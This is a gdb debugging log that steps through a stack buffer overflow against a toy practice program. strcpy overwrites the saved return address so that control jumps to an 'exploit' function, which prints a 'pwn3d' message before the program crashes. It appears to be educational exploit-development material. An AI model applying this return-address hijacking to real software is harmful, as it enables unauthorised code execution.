./exploit-stackoverflow.py 
[+] Sending payload to vulnerable application
Reading symbols from ./stackoverflow...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80484d8
(gdb) run
Starting program: stackoverflow ABCDEFGHIJKLMNOPQRSTUV��

Breakpoint 1, 0x080484d8 in main ()
(gdb) display /x $eax
1: /x $eax = 0xb7faa0a0
(gdb) display /x $ebx
2: /x $ebx = 0xb7fa8000
(gdb) display /x $ecx
3: /x $ecx = 0x236059d6
(gdb) display /x $edx
4: /x $edx = 0xbfffef64
(gdb) display /x $esi
5: /x $esi = 0x0
(gdb) display /x $esp
6: /x $esp = 0xbfffef38
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble $eip,+10
>x/16xw $esp
>end
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484d5 <+0>: push   ebp
   0x080484d6 <+1>: mov    ebp,esp
=> 0x080484d8 <+3>: and    esp,0xfffffff0
   0x080484db <+6>: sub    esp,0x10
   0x080484de <+9>: mov    DWORD PTR [esp+0x4],0x804847c
   0x080484e6 <+17>:    mov    DWORD PTR [esp],0x80486d4
   0x080484ed <+24>:    call   0x8048340 <printf@plt>
   0x080484f2 <+29>:    mov    DWORD PTR [esp+0x4],0x80484c1
   0x080484fa <+37>:    mov    DWORD PTR [esp],0x80486f8
   0x08048501 <+44>:    call   0x8048340 <printf@plt>
   0x08048506 <+49>:    mov    DWORD PTR [esp+0x4],0x80484d5
   0x0804850e <+57>:    mov    DWORD PTR [esp],0x804871c
   0x08048515 <+64>:    call   0x8048340 <printf@plt>
   0x0804851a <+69>:    cmp    DWORD PTR [ebp+0x8],0x2
   0x0804851e <+73>:    je     0x804853c <main+103>
   0x08048520 <+75>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048523 <+78>:    mov    eax,DWORD PTR [eax]
   0x08048525 <+80>:    mov    DWORD PTR [esp+0x4],eax
   0x08048529 <+84>:    mov    DWORD PTR [esp],0x804873f
   0x08048530 <+91>:    call   0x8048340 <printf@plt>
   0x08048535 <+96>:    mov    eax,0xffffffff
   0x0804853a <+101>:   jmp    0x8048551 <main+124>
   0x0804853c <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804853f <+106>:   add    eax,0x4
   0x08048542 <+109>:   mov    eax,DWORD PTR [eax]
---Type <return> to continue, or q <return> to quit---
   0x08048544 <+111>:   mov    DWORD PTR [esp],eax
   0x08048547 <+114>:   call   0x804847c <vuln>
   0x0804854c <+119>:   mov    eax,0x0
   0x08048551 <+124>:   leave  
   0x08048552 <+125>:   ret    
End of assembler dump.
(gdb) break *0x08048547
Breakpoint 2 at 0x8048547
(gdb) c
Continuing.
Address of function "vuln"   : 0x804847c
Address of function "exploit": 0x80484c1
Address of function "main"   : 0x80484d5
Dump of assembler code from 0x8048547 to 0x8048551:
=> 0x08048547 <main+114>:   call   0x804847c <vuln>
   0x0804854c <main+119>:   mov    eax,0x0
End of assembler dump.
0xbfffef20: 0xbffff1ec  0x080484d5  0x0804857b  0xb7fa8000
0xbfffef30: 0x00000000  0x08048390  0x00000000  0xb7e0972e
0xbfffef40: 0x00000002  0xbfffefd4  0xbfffefe0  0x00000000
0xbfffef50: 0x00000000  0x00000000  0xb7ff1079  0x0804824c

Breakpoint 2, 0x08048547 in main ()
6: /x $esp = 0xbfffef20
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffffd7
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbffff1ec
(gdb) stepi
Dump of assembler code from 0x804847c to 0x8048486:
=> 0x0804847c <vuln+0>: push   ebp
   0x0804847d <vuln+1>: mov    ebp,esp
   0x0804847f <vuln+3>: sub    esp,0x28
   0x08048482 <vuln+6>: mov    DWORD PTR [esp],0x80485f0
End of assembler dump.
0xbfffef1c: 0x0804854c  0xbffff1ec  0x080484d5  0x0804857b
0xbfffef2c: 0xb7fa8000  0x00000000  0x08048390  0x00000000
0xbfffef3c: 0xb7e0972e  0x00000002  0xbfffefd4  0xbfffefe0
0xbfffef4c: 0x00000000  0x00000000  0x00000000  0xb7ff1079
0x0804847c in vuln ()
6: /x $esp = 0xbfffef1c
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffffd7
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbffff1ec
(gdb) 
Dump of assembler code from 0x804847d to 0x8048487:
=> 0x0804847d <vuln+1>: mov    ebp,esp
   0x0804847f <vuln+3>: sub    esp,0x28
   0x08048482 <vuln+6>: mov    DWORD PTR [esp],0x80485f0
End of assembler dump.
0xbfffef18: 0xbfffef38  0x0804854c  0xbffff1ec  0x080484d5
0xbfffef28: 0x0804857b  0xb7fa8000  0x00000000  0x08048390
0xbfffef38: 0x00000000  0xb7e0972e  0x00000002  0xbfffefd4
0xbfffef48: 0xbfffefe0  0x00000000  0x00000000  0x00000000
0x0804847d in vuln ()
6: /x $esp = 0xbfffef18
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffffd7
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbffff1ec
(gdb) stepi
Dump of assembler code from 0x804847f to 0x8048489:
=> 0x0804847f <vuln+3>: sub    esp,0x28
   0x08048482 <vuln+6>: mov    DWORD PTR [esp],0x80485f0
End of assembler dump.
0xbfffef18: 0xbfffef38  0x0804854c  0xbffff1ec  0x080484d5
0xbfffef28: 0x0804857b  0xb7fa8000  0x00000000  0x08048390
0xbfffef38: 0x00000000  0xb7e0972e  0x00000002  0xbfffefd4
0xbfffef48: 0xbfffefe0  0x00000000  0x00000000  0x00000000
0x0804847f in vuln ()
6: /x $esp = 0xbfffef18
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffffd7
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbffff1ec
(gdb) 
Dump of assembler code from 0x8048482 to 0x804848c:
=> 0x08048482 <vuln+6>: mov    DWORD PTR [esp],0x80485f0
   0x08048489 <vuln+13>:    call   0x8048340 <printf@plt>
End of assembler dump.
0xbfffeef0: 0x00000000  0x08048390  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x0804871c  0xbfffef24  0xb7e3b130
0xbfffef10: 0xb7faa0a0  0xb7e3b136  0xbfffef38  0x0804854c
0xbfffef20: 0xbffff1ec  0x080484d5  0x0804857b  0xb7fa8000
0x08048482 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffffd7
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbffff1ec
(gdb) 
Dump of assembler code from 0x8048489 to 0x8048493:
=> 0x08048489 <vuln+13>:    call   0x8048340 <printf@plt>
   0x0804848e <vuln+18>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048491 <vuln+21>:    mov    DWORD PTR [esp+0x4],eax
End of assembler dump.
0xbfffeef0: 0x080485f0  0x08048390  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x0804871c  0xbfffef24  0xb7e3b130
0xbfffef10: 0xb7faa0a0  0xb7e3b136  0xbfffef38  0x0804854c
0xbfffef20: 0xbffff1ec  0x080484d5  0x0804857b  0xb7fa8000
0x08048489 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffffd7
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbffff1ec
(gdb) nexti
Stack before exploit:
 0x8048390
 0xbfffef38
 0xb7e3b158
 0xb7fa8e80
 0x804871c
 0xbfffef24
 0xb7e3b130
 0xb7faa0a0
 0xb7e3b136
 0xbfffef38
 0x804854c
 0xbffff1ec
 0x80484d5
 0x804857b
 0xb7fa8000
 (nil)

Dump of assembler code from 0x804848e to 0x8048498:
=> 0x0804848e <vuln+18>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048491 <vuln+21>:    mov    DWORD PTR [esp+0x4],eax
   0x08048495 <vuln+25>:    lea    eax,[ebp-0x12]
End of assembler dump.
0xbfffeef0: 0x080485f0  0x08048390  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x0804871c  0xbfffef24  0xb7e3b130
0xbfffef10: 0xb7faa0a0  0xb7e3b136  0xbfffef38  0x0804854c
0xbfffef20: 0xbffff1ec  0x080484d5  0x0804857b  0xb7fa8000
0x0804848e in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff34
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xcd
(gdb) stepi
Dump of assembler code from 0x8048491 to 0x804849b:
=> 0x08048491 <vuln+21>:    mov    DWORD PTR [esp+0x4],eax
   0x08048495 <vuln+25>:    lea    eax,[ebp-0x12]
   0x08048498 <vuln+28>:    mov    DWORD PTR [esp],eax
End of assembler dump.
0xbfffeef0: 0x080485f0  0x08048390  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x0804871c  0xbfffef24  0xb7e3b130
0xbfffef10: 0xb7faa0a0  0xb7e3b136  0xbfffef38  0x0804854c
0xbfffef20: 0xbffff1ec  0x080484d5  0x0804857b  0xb7fa8000
0x08048491 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff34
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbffff1ec
(gdb) 
Dump of assembler code from 0x8048495 to 0x804849f:
=> 0x08048495 <vuln+25>:    lea    eax,[ebp-0x12]
   0x08048498 <vuln+28>:    mov    DWORD PTR [esp],eax
   0x0804849b <vuln+31>:    call   0x8048350 <strcpy@plt>
End of assembler dump.
0xbfffeef0: 0x080485f0  0xbffff1ec  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x0804871c  0xbfffef24  0xb7e3b130
0xbfffef10: 0xb7faa0a0  0xb7e3b136  0xbfffef38  0x0804854c
0xbfffef20: 0xbffff1ec  0x080484d5  0x0804857b  0xb7fa8000
0x08048495 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff34
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbffff1ec
(gdb) 
Dump of assembler code from 0x8048498 to 0x80484a2:
=> 0x08048498 <vuln+28>:    mov    DWORD PTR [esp],eax
   0x0804849b <vuln+31>:    call   0x8048350 <strcpy@plt>
   0x080484a0 <vuln+36>:    lea    eax,[ebp-0x12]
End of assembler dump.
0xbfffeef0: 0x080485f0  0xbffff1ec  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x0804871c  0xbfffef24  0xb7e3b130
0xbfffef10: 0xb7faa0a0  0xb7e3b136  0xbfffef38  0x0804854c
0xbfffef20: 0xbffff1ec  0x080484d5  0x0804857b  0xb7fa8000
0x08048498 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff34
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbfffef06
(gdb) 
Dump of assembler code from 0x804849b to 0x80484a5:
=> 0x0804849b <vuln+31>:    call   0x8048350 <strcpy@plt>
   0x080484a0 <vuln+36>:    lea    eax,[ebp-0x12]
   0x080484a3 <vuln+39>:    mov    DWORD PTR [esp+0x4],eax
End of assembler dump.
0xbfffeef0: 0xbfffef06  0xbffff1ec  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x0804871c  0xbfffef24  0xb7e3b130
0xbfffef10: 0xb7faa0a0  0xb7e3b136  0xbfffef38  0x0804854c
0xbfffef20: 0xbffff1ec  0x080484d5  0x0804857b  0xb7fa8000
0x0804849b in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff34
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbfffef06
(gdb) nexti
Dump of assembler code from 0x80484a0 to 0x80484aa:
=> 0x080484a0 <vuln+36>:    lea    eax,[ebp-0x12]
   0x080484a3 <vuln+39>:    mov    DWORD PTR [esp+0x4],eax
   0x080484a7 <vuln+43>:    mov    DWORD PTR [esp],0x8048648
End of assembler dump.
0xbfffeef0: 0xbfffef06  0xbffff1ec  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x4241871c  0x46454443  0x4a494847
0xbfffef10: 0x4e4d4c4b  0x5251504f  0x56555453  0x080484c1
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0x080484a0 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xbfffef1a
3: /x $ecx = 0xbffff200
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbfffef06
(gdb) 
Dump of assembler code from 0x80484a3 to 0x80484ad:
=> 0x080484a3 <vuln+39>:    mov    DWORD PTR [esp+0x4],eax
   0x080484a7 <vuln+43>:    mov    DWORD PTR [esp],0x8048648
End of assembler dump.
0xbfffeef0: 0xbfffef06  0xbffff1ec  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x4241871c  0x46454443  0x4a494847
0xbfffef10: 0x4e4d4c4b  0x5251504f  0x56555453  0x080484c1
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0x080484a3 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xbfffef1a
3: /x $ecx = 0xbffff200
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbfffef06
(gdb) 
Dump of assembler code from 0x80484a7 to 0x80484b1:
=> 0x080484a7 <vuln+43>:    mov    DWORD PTR [esp],0x8048648
   0x080484ae <vuln+50>:    call   0x8048340 <printf@plt>
End of assembler dump.
0xbfffeef0: 0xbfffef06  0xbfffef06  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x4241871c  0x46454443  0x4a494847
0xbfffef10: 0x4e4d4c4b  0x5251504f  0x56555453  0x080484c1
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0x080484a7 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xbfffef1a
3: /x $ecx = 0xbffff200
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbfffef06
(gdb) 
Dump of assembler code from 0x80484ae to 0x80484b8:
=> 0x080484ae <vuln+50>:    call   0x8048340 <printf@plt>
   0x080484b3 <vuln+55>:    mov    DWORD PTR [esp],0x8048664
End of assembler dump.
0xbfffeef0: 0x08048648  0xbfffef06  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x4241871c  0x46454443  0x4a494847
0xbfffef10: 0x4e4d4c4b  0x5251504f  0x56555453  0x080484c1
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0x080484ae in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xbfffef1a
3: /x $ecx = 0xbffff200
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xbfffef06
(gdb) nexti
Copying ABCDEFGHIJKLMNOPQRSTUV�� onto the stack

Dump of assembler code from 0x80484b3 to 0x80484bd:
=> 0x080484b3 <vuln+55>:    mov    DWORD PTR [esp],0x8048664
   0x080484ba <vuln+62>:    call   0x8048340 <printf@plt>
End of assembler dump.
0xbfffeef0: 0x08048648  0xbfffef06  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x4241871c  0x46454443  0x4a494847
0xbfffef10: 0x4e4d4c4b  0x5251504f  0x56555453  0x080484c1
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0x080484b3 in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffffdd
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0x33
(gdb) stepi
Dump of assembler code from 0x80484ba to 0x80484c4:
=> 0x080484ba <vuln+62>:    call   0x8048340 <printf@plt>
   0x080484bf <vuln+67>:    leave  
   0x080484c0 <vuln+68>:    ret    
   0x080484c1 <exploit+0>:  push   ebp
   0x080484c2 <exploit+1>:  mov    ebp,esp
End of assembler dump.
0xbfffeef0: 0x08048664  0xbfffef06  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x4241871c  0x46454443  0x4a494847
0xbfffef10: 0x4e4d4c4b  0x5251504f  0x56555453  0x080484c1
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0x080484ba in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffffdd
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0x33
(gdb) nexti
Stack after exploit:
 0xbfffef06
 0xbfffef38
 0xb7e3b158
 0xb7fa8e80
 0x4241871c
 0x46454443
 0x4a494847
 0x4e4d4c4b
 0x5251504f
 0x56555453
 0x80484c1
 0xbffff100
 0x80484d5
 0x804857b
 0xb7fa8000
 (nil)

Dump of assembler code from 0x80484bf to 0x80484c9:
=> 0x080484bf <vuln+67>:    leave  
   0x080484c0 <vuln+68>:    ret    
   0x080484c1 <exploit+0>:  push   ebp
   0x080484c2 <exploit+1>:  mov    ebp,esp
   0x080484c4 <exploit+3>:  sub    esp,0x18
   0x080484c7 <exploit+6>:  mov    DWORD PTR [esp],0x80486bb
End of assembler dump.
0xbfffeef0: 0x08048664  0xbfffef06  0xbfffef38  0xb7e3b158
0xbfffef00: 0xb7fa8e80  0x4241871c  0x46454443  0x4a494847
0xbfffef10: 0x4e4d4c4b  0x5251504f  0x56555453  0x080484c1
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0x080484bf in vuln ()
6: /x $esp = 0xbfffeef0
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff33
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xce
(gdb) stepi
Dump of assembler code from 0x80484c0 to 0x80484ca:
=> 0x080484c0 <vuln+68>:    ret    
   0x080484c1 <exploit+0>:  push   ebp
   0x080484c2 <exploit+1>:  mov    ebp,esp
   0x080484c4 <exploit+3>:  sub    esp,0x18
   0x080484c7 <exploit+6>:  mov    DWORD PTR [esp],0x80486bb
End of assembler dump.
0xbfffef1c: 0x080484c1  0xbffff100  0x080484d5  0x0804857b
0xbfffef2c: 0xb7fa8000  0x00000000  0x08048390  0x00000000
0xbfffef3c: 0xb7e0972e  0x00000002  0xbfffefd4  0xbfffefe0
0xbfffef4c: 0x00000000  0x00000000  0x00000000  0xb7ff1079
0x080484c0 in vuln ()
6: /x $esp = 0xbfffef1c
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff33
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xce
(gdb) 
Dump of assembler code from 0x80484c1 to 0x80484cb:
=> 0x080484c1 <exploit+0>:  push   ebp
   0x080484c2 <exploit+1>:  mov    ebp,esp
   0x080484c4 <exploit+3>:  sub    esp,0x18
   0x080484c7 <exploit+6>:  mov    DWORD PTR [esp],0x80486bb
End of assembler dump.
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0xbfffef30: 0x00000000  0x08048390  0x00000000  0xb7e0972e
0xbfffef40: 0x00000002  0xbfffefd4  0xbfffefe0  0x00000000
0xbfffef50: 0x00000000  0x00000000  0xb7ff1079  0x0804824c
0x080484c1 in exploit ()
6: /x $esp = 0xbfffef20
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff33
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xce
(gdb) 
Dump of assembler code from 0x80484c2 to 0x80484cc:
=> 0x080484c2 <exploit+1>:  mov    ebp,esp
   0x080484c4 <exploit+3>:  sub    esp,0x18
   0x080484c7 <exploit+6>:  mov    DWORD PTR [esp],0x80486bb
End of assembler dump.
0xbfffef1c: 0x56555453  0xbffff100  0x080484d5  0x0804857b
0xbfffef2c: 0xb7fa8000  0x00000000  0x08048390  0x00000000
0xbfffef3c: 0xb7e0972e  0x00000002  0xbfffefd4  0xbfffefe0
0xbfffef4c: 0x00000000  0x00000000  0x00000000  0xb7ff1079
0x080484c2 in exploit ()
6: /x $esp = 0xbfffef1c
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff33
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xce
(gdb) 
Dump of assembler code from 0x80484c4 to 0x80484ce:
=> 0x080484c4 <exploit+3>:  sub    esp,0x18
   0x080484c7 <exploit+6>:  mov    DWORD PTR [esp],0x80486bb
End of assembler dump.
0xbfffef1c: 0x56555453  0xbffff100  0x080484d5  0x0804857b
0xbfffef2c: 0xb7fa8000  0x00000000  0x08048390  0x00000000
0xbfffef3c: 0xb7e0972e  0x00000002  0xbfffefd4  0xbfffefe0
0xbfffef4c: 0x00000000  0x00000000  0x00000000  0xb7ff1079
0x080484c4 in exploit ()
6: /x $esp = 0xbfffef1c
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff33
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xce
(gdb) 
Dump of assembler code from 0x80484c7 to 0x80484d1:
=> 0x080484c7 <exploit+6>:  mov    DWORD PTR [esp],0x80486bb
   0x080484ce <exploit+13>: call   0x8048360 <puts@plt>
End of assembler dump.
0xbfffef04: 0x4241871c  0x46454443  0x4a494847  0x4e4d4c4b
0xbfffef14: 0x5251504f  0x56555453  0x56555453  0xbffff100
0xbfffef24: 0x080484d5  0x0804857b  0xb7fa8000  0x00000000
0xbfffef34: 0x08048390  0x00000000  0xb7e0972e  0x00000002
0x080484c7 in exploit ()
6: /x $esp = 0xbfffef04
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff33
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xce
(gdb) 
Dump of assembler code from 0x80484ce to 0x80484d8:
=> 0x080484ce <exploit+13>: call   0x8048360 <puts@plt>
   0x080484d3 <exploit+18>: leave  
   0x080484d4 <exploit+19>: ret    
   0x080484d5 <main+0>: push   ebp
   0x080484d6 <main+1>: mov    ebp,esp
End of assembler dump.
0xbfffef04: 0x080486bb  0x46454443  0x4a494847  0x4e4d4c4b
0xbfffef14: 0x5251504f  0x56555453  0x56555453  0xbffff100
0xbfffef24: 0x080484d5  0x0804857b  0xb7fa8000  0x00000000
0xbfffef34: 0x08048390  0x00000000  0xb7e0972e  0x00000002
0x080484ce in exploit ()
6: /x $esp = 0xbfffef04
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0x7fffff33
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0xce
(gdb) nexti
Oops, I've been pwn3d!!
Dump of assembler code from 0x80484d3 to 0x80484dd:
=> 0x080484d3 <exploit+18>: leave  
   0x080484d4 <exploit+19>: ret    
   0x080484d5 <main+0>: push   ebp
   0x080484d6 <main+1>: mov    ebp,esp
   0x080484d8 <main+3>: and    esp,0xfffffff0
   0x080484db <main+6>: sub    esp,0x10
End of assembler dump.
0xbfffef04: 0x080486bb  0x46454443  0x4a494847  0x4e4d4c4b
0xbfffef14: 0x5251504f  0x56555453  0x56555453  0xbffff100
0xbfffef24: 0x080484d5  0x0804857b  0xb7fa8000  0x00000000
0xbfffef34: 0x08048390  0x00000000  0xb7e0972e  0x00000002
0x080484d3 in exploit ()
6: /x $esp = 0xbfffef04
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0xffffffff
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0x18
(gdb) stepi
Dump of assembler code from 0x80484d4 to 0x80484de:
=> 0x080484d4 <exploit+19>: ret    
   0x080484d5 <main+0>: push   ebp
   0x080484d6 <main+1>: mov    ebp,esp
   0x080484d8 <main+3>: and    esp,0xfffffff0
   0x080484db <main+6>: sub    esp,0x10
End of assembler dump.
0xbfffef20: 0xbffff100  0x080484d5  0x0804857b  0xb7fa8000
0xbfffef30: 0x00000000  0x08048390  0x00000000  0xb7e0972e
0xbfffef40: 0x00000002  0xbfffefd4  0xbfffefe0  0x00000000
0xbfffef50: 0x00000000  0x00000000  0xb7ff1079  0x0804824c
0x080484d4 in exploit ()
6: /x $esp = 0xbfffef20
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0xffffffff
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0x18
(gdb) 
Dump of assembler code from 0xbffff100 to 0xbffff10a:
=> 0xbffff100:  add    BYTE PTR [eax],dl
   0xbffff102:  add    BYTE PTR [eax],al
   0xbffff104:  adc    DWORD PTR [eax],eax
   0xbffff106:  add    BYTE PTR [eax],al
   0xbffff108:  add    BYTE PTR fs:[eax],al
End of assembler dump.
0xbfffef24: 0x080484d5  0x0804857b  0xb7fa8000  0x00000000
0xbfffef34: 0x08048390  0x00000000  0xb7e0972e  0x00000002
0xbfffef44: 0xbfffefd4  0xbfffefe0  0x00000000  0x00000000
0xbfffef54: 0x00000000  0xb7ff1079  0x0804824c  0x0804993c
0xbffff100 in ?? ()
6: /x $esp = 0xbfffef24
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0xffffffff
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0x18
(gdb) 

Program received signal SIGSEGV, Segmentation fault.
Dump of assembler code from 0xbffff100 to 0xbffff10a:
=> 0xbffff100:  add    BYTE PTR [eax],dl
   0xbffff102:  add    BYTE PTR [eax],al
   0xbffff104:  adc    DWORD PTR [eax],eax
   0xbffff106:  add    BYTE PTR [eax],al
   0xbffff108:  add    BYTE PTR fs:[eax],al
End of assembler dump.
0xbfffef24: 0x080484d5  0x0804857b  0xb7fa8000  0x00000000
0xbfffef34: 0x08048390  0x00000000  0xb7e0972e  0x00000002
0xbfffef44: 0xbfffefd4  0xbfffefe0  0x00000000  0x00000000
0xbfffef54: 0x00000000  0xb7ff1079  0x0804824c  0x0804993c
0xbffff100 in ?? ()
6: /x $esp = 0xbfffef24
5: /x $esi = 0x0
4: /x $edx = 0xb7fa9ad0
3: /x $ecx = 0xffffffff
2: /x $ebx = 0xb7fa8000
1: /x $eax = 0x18
(gdb)
